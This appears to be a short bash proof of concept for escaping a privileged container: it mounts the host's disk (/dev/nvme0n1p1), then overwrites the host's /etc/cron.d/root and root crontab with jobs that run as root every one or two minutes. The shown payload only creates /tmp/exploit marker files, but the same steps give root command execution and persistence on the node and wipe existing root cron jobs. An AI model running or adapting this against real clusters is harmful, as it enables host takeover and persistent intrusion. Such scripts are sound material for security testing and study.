#!/bin/bash

mkdir -p /mnt/node_filesystem
mount /dev/nvme0n1p1 /mnt/node_filesystem
mkdir -p /mnt/node_filesystem/var/spool/cron
echo -e '*/1 * * * * root /bin/touch /tmp/exploit_1.txt\n##################################################' > /mnt/node_filesystem/etc/cron.d/root
echo -e '*/2 * * * * /bin/touch /tmp/exploit_2.txt\n##################################################' > /mnt/node_filesystem/var/spool/cron/root
chmod 600 /mnt/node_filesystem/var/spool/cron/root 
chown 0:0 /mnt/node_filesystem/var/spool/cron/root